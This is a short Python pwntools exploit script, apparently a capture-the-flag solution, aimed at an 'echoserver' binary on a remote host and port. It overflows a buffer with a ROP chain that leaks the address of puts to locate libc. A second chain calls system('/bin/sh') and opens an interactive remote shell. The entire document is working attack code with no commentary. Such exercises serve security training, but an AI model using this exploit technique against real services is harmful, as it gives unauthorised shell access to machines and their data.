from pwn import *

#io = process('./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b')
io = remote('125.235.240.166',20101)
elf = ELF('./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pl = b'QUIT'+b'A'*132+p64(0x00000000004012cb)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(0x00000000004011ae)
io.sendline(pl)
print(io.recvuntil('\n'))
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym['puts']
print(hex(libc.address))

pl = b'QUIT'+b'A'*132+p64(0x00000000004012cb)+p64(next(libc.search(b'/bin/sh')))+p64(0x0000000000401016)+p64(libc.sym['system'])
io.sendline(pl)
io.interactive()
